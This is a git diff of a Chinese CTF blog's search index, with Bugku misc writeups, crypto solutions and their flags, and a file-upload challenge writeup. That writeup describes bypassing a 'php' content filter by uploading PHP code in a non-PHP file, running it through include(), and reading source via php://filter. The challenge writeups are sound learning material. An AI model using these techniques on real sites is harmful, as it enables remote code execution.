@@ -1,9 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Bugku杂项misc writeup(1)</title>
+    <url>/2021/05/24/20210524/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Bugku杂项misc-writeup-1"><a href="#Bugku杂项misc-writeup-1" class="headerlink" title="Bugku杂项misc writeup(1)"></a>Bugku杂项misc writeup(1)</h1><p>前几天在Bugku上做misc的时候做到几道挺好的题目，想写个复盘跟大家分享下。欢迎各位大佬互相交流  1.善用工具  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/1-2-1024x615.png"> 文件如下:  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/2-2.png"> 先看看hint文件，发现png格式打不开，试试用txt文本打开  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/3-3.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/4-3-1024x485.png"> (干得漂亮)  试试用winhex打开，发现一段神秘代码   <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/5-3.png"> 在查询一番资料过后得知这是UUEncode+base85加密  Uuencode解密网址: <a href="http://www.mxcz.net/tools/UUEncode.aspx">http://www.mxcz.net/tools/UUEncode.aspx</a> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/6-3.png"> 再将”keyis”去除进行base85解密: <a href="http://www.atoolbox.net/Tool.php?Id=934">http://www.atoolbox.net/Tool.php?Id=934</a> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/7-3.png"> 联系下标题&lt;善用工具&gt;，百读搜索下Camouflage软件，发现是个用AES加密算法把隐藏的文件存放到jpg图片中的软件  那意思很明确了,就是把那张水晶的图片放进去解一下  (下载地址：<a href="https://www.onlinedown.net/soft/94324.htm">https://www.onlinedown.net/soft/94324.htm</a>)  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/8-3.png"> 是一个docx文档，放到winhex看看  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/9-3.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/10-3.png"> 看到PK果断改后缀为zip  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/11-3.png"> 是一个xml文件，在一番遍历后，word文件夹下的document.xml找到了密码  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/12-4.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/13-4-1024x676.png"> 密码为XiAo_1U  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/14-3.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/15-4.png"> 我们用kali下的file看一下是什么格式的文件  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/16-4.png"> riff(用画图打开)或者webp(用浏览器打开)格式都可以  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/17-3-1024x646.png"> (WDNMD)  之后可以用python的stegpy的脚本解码解密  pip install stegpy  stegpy csgo.webp(csgo.riff)  拿下  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/18-2.png"> 2.Photo的自我修养  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/19-2.png"> 压缩包含有以下文件：  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/20-2.png"> 第一眼看去应该是要先分别解出001和002的给的密码再解出keyAB就能拿flag了  先看001压缩包  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/21-3.png"> 这里有可能是_<strong>伪加密</strong>_ 所谓伪加密就是将压缩包中全局方式位标记更改，00为无加密，其余为加密  详细可参考<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a>  一般 全局方式位标记的位置 在 压缩包的文件头标记 或 结束标记 旁边(比如504B0102、504B0304、504B0506)，所以我们先用winhex打开看看，用HEX搜索压缩包的文件头(504B)  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/22-1.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/23-2.png"></p>
+<h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><p><strong><a href="#20" title="2021-06-01 10:10:28">BLiss</a>:</strong> 牛牛牛</p>
+]]></content>
+      <categories>
+        <category>刷题笔记</category>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>刷题</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>利用xpath爬取edu漏洞列表</title>
     <url>/2021/05/07/20210507/</url>
-    <content><![CDATA[<h1 id="利用xpath爬取edu漏洞列表"><a href="#利用xpath爬取edu漏洞列表" class="headerlink" title="利用xpath爬取edu漏洞列表"></a>利用xpath爬取edu漏洞列表</h1><p>EduSrcSelect用了xpath爬取了某edu平台的漏洞列表大学(阿这,主要是正则不会)，包括标题、时间、作者。可通过输入cookie、查询页数和查找内容进行查询，可以看看有木有重复吧(应该)，下载地址在最底下。</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="利用xpath爬取edu漏洞列表"><a href="#利用xpath爬取edu漏洞列表" class="headerlink" title="利用xpath爬取edu漏洞列表"></a>利用xpath爬取edu漏洞列表</h1><p>EduSrcSelect用了xpath爬取了某edu平台的漏洞列表大学(阿这,主要是正则不会)，包括标题、时间、作者。可通过输入cookie、查询页数和查找内容进行查询，可以看看有木有重复吧(应该)，下载地址在最底下。</p>
 <p>上图</p>
 <p><img src="http://www.0dayhack.net/wp-content/uploads/2021/05/1-1-1024x357.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/2-1-1024x484.png"> </p>
 <p><strong>效果还阔以嘛</strong></p>
@@ -59,24 +74,9 @@
       </tags>
   </entry>
   <entry>
-    <title>Bugku杂项misc writeup(1)</title>
-    <url>/2021/05/24/20210524/</url>
-    <content><![CDATA[<h1 id="Bugku杂项misc-writeup-1"><a href="#Bugku杂项misc-writeup-1" class="headerlink" title="Bugku杂项misc writeup(1)"></a>Bugku杂项misc writeup(1)</h1><p>前几天在Bugku上做misc的时候做到几道挺好的题目，想写个复盘跟大家分享下。欢迎各位大佬互相交流  1.善用工具  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/1-2-1024x615.png"> 文件如下:  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/2-2.png"> 先看看hint文件，发现png格式打不开，试试用txt文本打开  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/3-3.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/4-3-1024x485.png"> (干得漂亮)  试试用winhex打开，发现一段神秘代码   <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/5-3.png"> 在查询一番资料过后得知这是UUEncode+base85加密  Uuencode解密网址: <a href="http://www.mxcz.net/tools/UUEncode.aspx">http://www.mxcz.net/tools/UUEncode.aspx</a> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/6-3.png"> 再将”keyis”去除进行base85解密: <a href="http://www.atoolbox.net/Tool.php?Id=934">http://www.atoolbox.net/Tool.php?Id=934</a> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/7-3.png"> 联系下标题&lt;善用工具&gt;，百读搜索下Camouflage软件，发现是个用AES加密算法把隐藏的文件存放到jpg图片中的软件  那意思很明确了,就是把那张水晶的图片放进去解一下  (下载地址：<a href="https://www.onlinedown.net/soft/94324.htm">https://www.onlinedown.net/soft/94324.htm</a>)  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/8-3.png"> 是一个docx文档，放到winhex看看  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/9-3.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/10-3.png"> 看到PK果断改后缀为zip  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/11-3.png"> 是一个xml文件，在一番遍历后，word文件夹下的document.xml找到了密码  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/12-4.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/13-4-1024x676.png"> 密码为XiAo_1U  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/14-3.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/15-4.png"> 我们用kali下的file看一下是什么格式的文件  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/16-4.png"> riff(用画图打开)或者webp(用浏览器打开)格式都可以  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/17-3-1024x646.png"> (WDNMD)  之后可以用python的stegpy的脚本解码解密  pip install stegpy  stegpy csgo.webp(csgo.riff)  拿下  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/18-2.png"> 2.Photo的自我修养  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/19-2.png"> 压缩包含有以下文件：  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/20-2.png"> 第一眼看去应该是要先分别解出001和002的给的密码再解出keyAB就能拿flag了  先看001压缩包  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/21-3.png"> 这里有可能是_<strong>伪加密</strong>_ 所谓伪加密就是将压缩包中全局方式位标记更改，00为无加密，其余为加密  详细可参考<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a>  一般 全局方式位标记的位置 在 压缩包的文件头标记 或 结束标记 旁边(比如504B0102、504B0304、504B0506)，所以我们先用winhex打开看看，用HEX搜索压缩包的文件头(504B)  <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/22-1.png"> <img src="http://www.0dayhack.net/wp-content/uploads/2021/05/23-2.png"></p>
-<h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><p><strong><a href="#20" title="2021-06-01 10:10:28">BLiss</a>:</strong> 牛牛牛</p>
-]]></content>
-      <categories>
-        <category>刷题笔记</category>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>刷题</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Bugku杂项misc writeup(2)</title>
     <url>/2021/05/28/20210528/</url>
-    <content><![CDATA[<h1 id="Bugku杂项misc-writeup-2"><a href="#Bugku杂项misc-writeup-2" class="headerlink" title="Bugku杂项misc writeup(2)"></a>Bugku杂项misc writeup(2)</h1><p>题目(Mumumisc&amp;只有黑棋的棋盘&amp;北有楠木)</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Bugku杂项misc-writeup-2"><a href="#Bugku杂项misc-writeup-2" class="headerlink" title="Bugku杂项misc writeup(2)"></a>Bugku杂项misc writeup(2)</h1><p>题目(Mumumisc&amp;只有黑棋的棋盘&amp;北有楠木)</p>
 <p>涉及到的网站和工具:</p>
 <p>Wbs43open-win32链接: <a href="https://pan.baidu.com/s/1g8AbhV1EVDuiZS7PpcFUzw">https://pan.baidu.com/s/1g8AbhV1EVDuiZS7PpcFUzw</a>  密码: svhi</p>
 <p>音符解码网址: <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</a></p>
@@ -139,7 +139,7 @@
   <entry>
     <title>-安利-个人觉得几款在misc中冷门而好用的工具</title>
     <url>/2021/06/01/20210601/</url>
-    <content><![CDATA[<h1 id="安利-个人觉得几款在misc中冷门而好用的工具"><a href="#安利-个人觉得几款在misc中冷门而好用的工具" class="headerlink" title="[安利]个人觉得几款在misc中冷门而好用的工具"></a>[安利]个人觉得几款在misc中冷门而好用的工具</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>最近做了不少的misc题，很多冷知识触及到我的知识盲区。我找了相应的工具，挺适合于解密或者出题，分享一下。</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="安利-个人觉得几款在misc中冷门而好用的工具"><a href="#安利-个人觉得几款在misc中冷门而好用的工具" class="headerlink" title="[安利]个人觉得几款在misc中冷门而好用的工具"></a>[安利]个人觉得几款在misc中冷门而好用的工具</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>最近做了不少的misc题，很多冷知识触及到我的知识盲区。我找了相应的工具，挺适合于解密或者出题，分享一下。</p>
 <ul>
 <li>目录：<ul>
 <li>SlientEye-–隐写&#x2F;加密</li>
@@ -211,7 +211,7 @@
   <entry>
     <title>记一次文件上传之过滤php绕过</title>
     <url>/2021/10/14/20211014/</url>
-    <content><![CDATA[<!--今天在群里看到群友发的一道题 想试试 解了一个多小时 过程挺有趣 就记录一下了 学到新的绕过姿势-->
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!--今天在群里看到群友发的一道题 想试试 解了一个多小时 过程挺有趣 就记录一下了 学到新的绕过姿势-->
 
 <h1 id="记一次文件上传之过滤php绕过"><a href="#记一次文件上传之过滤php绕过" class="headerlink" title="记一次文件上传之过滤php绕过"></a>记一次文件上传之过滤php绕过</h1><p>今天在群里看到群友发的一道题 想试试 解了一个多小时 过程挺有趣 就记录一下了 学到新的绕过姿势 <img src="http://www.anyiblog.top/uploads/2021/12/874dc429460d889cb885cedef68b295f.png"> 看题； <img src="http://www.anyiblog.top/uploads/2021/12/095c93515297178510c14a9120098f25.png"> 一道文件上传+文件包含的题目 bp上传如下 <img src="http://www.anyiblog.top/uploads/2021/12/d9f1c83b950af13dfad37c95aeb45370.png"> 经过测试文件名含有ph过滤 文件内容含有php过滤 上传后发现注释  <!--read.php?filename=  --> 访问后尝试进行文件包含，如下 <img src="http://www.anyiblog.top/uploads/2021/12/5a0326775979e47db80f3c4998383744.png"> 显然 这是文件包含没错 试着读取flag <img src="http://www.anyiblog.top/uploads/2021/12/c198b7c7b96a0704084d72521b2f06c8.png"> 被过滤了 目前思路是通过上传jpg或者txt 然后内容写入php代码 即使文件不是以php后缀结尾，仍可以利用include特性执行代码 因此，我们需要绕过对内容的过滤 在此之前，我们可以用php:filter伪协议读取文件源码 <img src="http://www.anyiblog.top/uploads/2021/12/64ef029d9501da7bbb688967abd0cf86.png"> base64解码后代码如下： </p>
 <pre><code>&lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;
@@ -281,400 +281,9 @@ include($a);
       </tags>
   </entry>
   <entry>
-    <title>两款包含但不限于base系列的解密工具</title>
-    <url>/2021/12/03/20211203/</url>
-    <content><![CDATA[<!--前言&gt;-->
-
-<h1 id="两款包含但不限于base系列的解密工具"><a href="#两款包含但不限于base系列的解密工具" class="headerlink" title="两款包含但不限于base系列的解密工具"></a>两款包含但不限于base系列的解密工具</h1><p>前言&gt; 在之前一次ctf比赛中的一个base62，因为自己工具太少，网上资源找大半天，最后解出来的还不是flag。 所以这次吸取教训，收集了两款包含但不限于base解码的工具。因为网上使用教程太过普及或太少了，所以这里附上安装方法和使用说明。   1.basecrack 工具简介： BaseCrack能够支持目前社区使用最为频繁的Base编码机制，其中包括Base16、Base32、Base36、Base58、Base62、Base64、Base64Url、Base85、Base91、Base92等等。除此之外，该工具也可以为CTF比赛，漏洞奖励计划和数据加密解密提供有效帮助。 注意：当前版本的BaseCrack可同时支持Python2和Python3环境。 </p>
-<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ul>
-<li>能够对任意模式的多重Base编码数据进行解码；</li>
-<li>能够对来自文件的多个Base编码数据进行解码；</li>
-<li>能够利用解码后的Base数据生成字典文件并输出；</li>
-<li>能够对目标Base数据的编码方案类型进行预测；<br>安装方法： 可以使用下列命令将该项目源码克隆至本地： $ git clone <a href="https://github.com/mufeedvh/basecrack.git">https://github.com/mufeedvh/basecrack.git</a> $ cd basecrack $ pip install –default-time&#x3D;100 -r requirements.txt 这里安装有个坑就是要用–default-time&#x3D;100设置超时时间，否则pip超时过久就会报错，也算是个小经验吧，在很多安装中用–default-time&#x3D;100有奇效。   然后安装完可能会报错说你还缺少一个模块   <img src="http://www.anyiblog.top/uploads/2021/12/6fa4dfd5c8e8e20d0d763b564497e489.png">   进行安装termcolor会有以下报错： <img src="http://www.anyiblog.top/uploads/2021/12/238dc579606367d19899823da7b316fb.png">   用这条即可解决 (这里target要根据报错的路径来) sudo pip install -target&#x3D;path termcolor   <img src="http://www.anyiblog.top/uploads/2021/12/3bda6fc7369361caab0502ebd997884a.png">   最后python basecrack.py即可运行   <img src="http://www.anyiblog.top/uploads/2021/12/b9a613ec4864290044958370788e425a.png"> 使用方法： 对来自用户输入的单个Base编码数据进行解码： python basecrack.py 对通过参数（-b&#x2F;–base）传递的单个Base编码数据进行解码： python basecrack.py -b SGVsbG8gV29ybGQh 对通过文件（-f&#x2F;–file）传递的多个Base编码数据进行解码： python basecrack.py -f file.txt 对任意模式的多重Base编码数据进行解码（-m&#x2F;–magic）： python basecrack.py –magic 使用解码的Base数据生成字典文件并输出（-o&#x2F;–output）： python basecrack.py -f file.txt -o output-wordlist.txt   2.ciphey 工具简介： Ciphey 是一个使用自然语言处理和人工智能的全自动解密&#x2F;解码&#x2F;破解工具。 简单地来讲，你只需要输入加密文本，它就能给你返回解密文本。 支持的解密：</li>
-</ul>
-<ol>
-<li>维吉尼亚密码</li>
-<li>凯撒加密</li>
-<li>反向密码（把明文反过来作为加密）</li>
-<li>换位密码（不过我自己试了试感觉好像不好解出来）</li>
-<li>替换密码<br>Ciphey 支持破解 6 种基础加密： <img src="http://www.anyiblog.top/uploads/2021/12/0c786c9b094b86af7eb77f7fb883073e.png"> 16 种编码： <img src="http://www.anyiblog.top/uploads/2021/12/b8ca07270cca6244371d8e914f6a8d20.png"> 哈希也支持，不过效果不可控。   安装方法：    注意!注意！！注意！！！ 不能是 python3.9版本   <strong>不能是 python 32位版本</strong> 建议使用 python 3.8 64位版本：python-3.8.10-amd64.exe    请选择以下任一种方式输入命令安装依赖： 1. Windows 环境 打开 Cmd (开始-运行-CMD)。 2. MacOS 环境 打开 Terminal (command+空格输入Terminal)。 3. 如果你用的是 VSCode编辑器 或 Pycharm，可以直接使用界面下方的Terminal. pip install -U ciphey&amp;pip install ciphey -i <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a> windows下安装完运行可能会报错 UnicodeDecodeError: ‘gbk’ codec can’t decode byte 0xbf 然后就是要修改 ..\envs\对应的环境名\Lib\site-packages\pywhat\regex_identifier.py 根据错误修改代码，主要是在读取文件的时候发生错误，将”r” 改为”rb”,即可。   <img src="http://www.anyiblog.top/uploads/2021/12/726b6a36f48b0f04b9ae2102517f8e1b.webp"> 使用方法：   主要以下两种用法：   (在编辑器下使用效果最佳，命令行下颜色代码显示不出来影响观感) 命令行下输入： ciphey -t “密文” ciphey -f 文件名 例如： ciphey -t ‘aGVsbG8gbXkgbmFtZSBpcyBiZWU&#x3D;’ cipyhey -f flag.txt <img src="http://www.anyiblog.top/uploads/2021/12/9c7b750415a8b62ac979b566f5e00a84.png">   <img src="http://www.anyiblog.top/uploads/2021/12/3fa55bbd28c2a7cce574fb1947068626.png"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>干货</category>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>干货</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2022长安战&quot;疫&quot;WriteUp</title>
-    <url>/2022/01/09/20220109/</url>
-    <content><![CDATA[<p><span style="font-size: 12pt">前言&gt;</span></p>
-<p><span style="font-size: 10pt;font-style: italic">“</span> <span style="letter-spacing: normal;text-indent: 32px;text-transform: none;font-size: 10pt;font-style: italic">他们以”逆行”的姿态为我们筑起一道坚固的”防护墙”，他们在打一场没有硝烟的疫情战，是一条永无退路并且必胜阻击战。他们，就是这个时代的最美逆行者。</span><span style="font-size: 10pt;font-style: italic">“–致所有疫情工作者</span></p>
-<p>2022年疫情再起 作为南方人也希望疫情能好转， 为西安同时也为天津、郑州等加油 希望他们能挺过这次难关！</p>
-<p>疫情期间网络安全意识需提升 便诞生了本次比赛。</p>
-<p>此次比赛由600多名选手参加 我们队伍也是有幸排到了第17名 师傅们都太卷了 将近30道题都要AK了 tql</p>
-<p><img src="/uploads/2022/01/5fcab21eff6da6241a5c4abff460ba4f.png"></p>
-<p>这次难度还算比较友好，大多数题目都能做也不至于爆0，所以做的过程还是挺舒坦的。</p>
-<p>证书是前50%就能拿到的，尽管是这样师傅们也没放弃做题，这种做题的精神是提倡和支持的，比赛最重要的就是竞技精神。</p>
-<p>以下分享由我和另一位师傅HuMoLix 组成战队0x04的解题思路</p>
-<p><span style="font-size: 12pt">解题思路&gt;</span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目一八卦迷宫</span></span></p>
-<p><span style="font-size: 12pt">题目附件如下：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/681df6392af383881eddadc4a4d5cf62.png"></span></p>
-<p><span style="font-size: 12pt">走迷宫 再把路过的格子对应的字填入即可</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/38747c3e8ec898313c161f24cdf2f6c0.png"></span></p>
-<p><span style="font-size: 12pt">用画图画了下</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">然后对应了一下 最后flag为</span></p>
-<p><span style="font-size: 12pt">cazy{zhan chang yang chang zhan yang he chang shan shan an zhan yi yi zhan yi an yi chang an yang}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">FLAG值：cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目二no_cry_no_can</span></span></p>
-<p><span style="font-size: 12pt">拿到题目后，我们分析题目得知，主要是由 can_encrypt(flag,key) 函数对flag进行加密</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/ebb5bc0625f2fc6de5f592a8bc8a24a3.png"></span></p>
-<p><span style="font-size: 12pt">通过分析函数，我们可以发现，它是将加密系数 key 进行重组，实际上是将一个key变为多个key 例如 (key: “skip” &#x3D;&gt; new_key: “skipskipskipskip”)知道new_key的长度大于或等于flag，然后再将new_key中的单一字符串于flag中的单一字符串进行异或加密，这类似于古典密码学中的维吉尼亚加密。</span></p>
-<p><span style="font-size: 12pt">由于我们知道flag的前五位是由 cazy{ 组成，那么我们就可以通过密文来回退 key了，因为 key的长度 小于等于 5。</span></p>
-<p><span style="font-size: 12pt">我们可以通过list()函数来将bytes值转为ASCII数组之后进行异或操作。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/3b449eb558ad954ec1a8639c4a7e2481.png"></span></p>
-<p><span style="font-size: 12pt">我们可以根据异或的特性 a ^ b &#x3D; c ，c ^ b &#x3D; a来回推我们的key</span></p>
-<p><span style="font-size: 12pt">key &#x3D; [60 ^ ord(&amp;apos;c&amp;apos;), 112 ^ ord(&amp;apos;a&amp;apos;), 72 ^ ord(&amp;apos;z&amp;apos;), 134 ^ ord(&amp;apos;y&amp;apos;), 26 ^ ord(&amp;apos;{&amp;apos;)]</span></p>
-<p><span style="font-size: 12pt">然后将key通过解密函数对flag进行解密，就可以得到flag了。</span></p>
-<pre><code>#!/usr/bin/python3
-from Crypto.Util.number import *
-def decrypt(key,flag):
-    block_len = len(flag) // len(key) + 1
-    new_key = key * block_len
-    return bytes([i^j for i,j in zip(flag,new_key)])
-
-key = [95, 17, 50, 255, 97]
-flag = [60, 112, 72, 134, 26, 38, 34, 109, 206, 18, 0, 112, 109, 151, 85, 49, 117, 65, 207, 12, 58, 78, 80, 207, 24, 126, 108]
-
-print(decrypt(key,flag))
-=&gt; b&#39;cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;&#39;
-</code></pre>
-<p><span style="font-size: 12pt">FLAG值：cazy{y3_1s_a_h4nds0me_b0y!}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目三combat_slogan</span></span></p>
-<p><span style="font-size: 12pt">题目附件如下：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/007e0a7ce728b17a1a83a8bc5b2203fe.png"></span></p>
-<p><span style="font-size: 12pt">一个jar文件</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">用Apktool Box 打开jar</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/d1e3f8c7bbf0fb00c18eec07d408d4c4.png"></span></p>
-<p><span style="font-size: 12pt">看Main函数：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/a2a7c73ff92e10bf7327c6d0531122f5.png"></span></p>
-<p><span style="font-size: 12pt">大致是通过输入的字符串通过ttk类实现加减ascii码 然后要等于Jr_j11y_s1tug_g0_raq_g0_raq_pnml</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">用在线工具调试了一下程序 发现这玩意有点凯撒的感觉 然后仔细一数这不是rot13嘛。。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/050f31c4e152b7450229433c5b14aee2.png"></span></p>
-<p><span style="font-size: 12pt">直接把字符串在线rot13转换一下</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/8ad8aaa1c88aebd7e1816151251fd0ae.png"></span></p>
-<p><span style="font-size: 12pt">包上cazy得到flag 提交正确。</span></p>
-<p><span style="font-size: 12pt">FLAG值：cazy{ We_w11l_f1ght_t0_end_t0_end_cazy }</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目四no_can_no_bb</span></span></p>
-<p><span style="font-size: 12pt">拿到题目，我们发现存在两个函数，一个 pad(m) 一个 encrypt(m, key)，我们主要需要分析的函数就是pad</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/ce871a946d7feba7f137e31f0a292fba.png"></span></p>
-<p><span style="font-size: 12pt">分析pad 函数，我们发现他是将不足16位的文件补足，比16位大的文件补至32位，以此类推。</span></p>
-<p><span style="font-size: 12pt">而且可以看到key 的范围并不大，仅仅只有1 - 1&lt;&lt;20 (1048576)，所以这道题目最理想的解题方式就是爆破key，因为AES的ECB模式并不需要考虑iv（偏移量）。</span></p>
-<pre><code>#!/usr/bin/python3
-from Crypto.Util.number import *
-from Crypto.Cipher import AES
-def pad(m):
-    tmp = 16-(len(m)%16)
-    return m + bytes([tmp for _ in range(tmp)])
-
-for i in range(1,1&lt;&lt;20):
-    cipher = b&#39;\x9d\x18K\x84n\xb8b&#39;\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#39;
-    key = pad(long_to_bytes(i))
-    aes = AES.new(key,AES.MODE_ECB)
-    if aes.decrypt(cipher)[:5] == b&#39;cazy&#123;&#39;:
-        print(aes.decrypt(cipher))
-    else:
-        pass
-=&gt;b&#39;cazy&#123;n0_c4n,bb?n0p3!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#39;
-</code></pre>
-<p><span style="font-size: 12pt">FLAG值：cazy{n0_c4n,bb?n0p3!}</span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt"><span style="font-size: 12pt;font-weight: bold">题目五西安加油</span></span></p>
-<p><span style="font-size: 12pt">打开流量包</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/367a49bb906f47b14dcba0b380d9d354.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">追踪TCP流 发现一段base64</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/641fd27b60ff2af43052516f10442e28.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">Save提取至txt文本 然后再把无关字符去掉 最后得到：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/2bbe11d9f6a9e32c3fe8c478d23b9bf0.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">用python解密一下</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/4ec88875b2bc261e868693f59ea7c855.png"></span></p>
-<p><span style="font-size: 12pt"> </span></p>
-<p><span style="font-size: 12pt">得到一堆二进制文件 再写入文件</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/f6a61d3d11f5ce3b6add229587bb4fd9.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">Winhex分析一下 发现是一个压缩包</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/74ecf6b030158d1e6773368f89a34c5e.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">改后缀。解压后得到了一堆图片，很明显是拼图题。</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/02b7cd292b01c2ff3257b53dc6d244e8.png"></span></p>
-<p><span style="font-size: 12pt"></span></p>
-<p><span style="font-size: 12pt">因为没有装gaps所以只好ps手拼，为了好拼百度搜索查找一番后找到了原图：</span></p>
-<p><span style="font-size: 12pt"><img src="/uploads/2022/01/92bbcc9e061875e226c22a04d794e61a.png"></span></p>
